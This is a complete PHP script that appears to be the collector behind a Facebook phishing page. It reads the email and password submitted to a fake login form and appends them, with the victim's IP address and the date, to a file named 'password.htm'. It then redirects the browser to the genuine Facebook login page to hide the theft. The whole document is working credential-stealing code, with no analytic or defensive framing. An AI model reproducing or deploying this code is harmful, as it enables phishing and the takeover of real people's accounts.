<?php $file = "password.htm";
$username = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "<Br>");
fwrite($handle, "<Br>");
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "<Br>");
fwrite($handle, "Email: ");
fwrite($handle, "$username");
fwrite($handle, "<Br>");
fwrite($handle, "Password: ");
fwrite($handle, "$password");
fwrite($handle, "<Br>");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "<Br>");
fwrite($handle, "Date Submitted: ");
fwrite($handle, "$today");
fwrite($handle, "<Br>");
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "<Br>");
fwrite($handle, "<Br>");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://login.facebook.com/\";
// -->
</script>";
?>
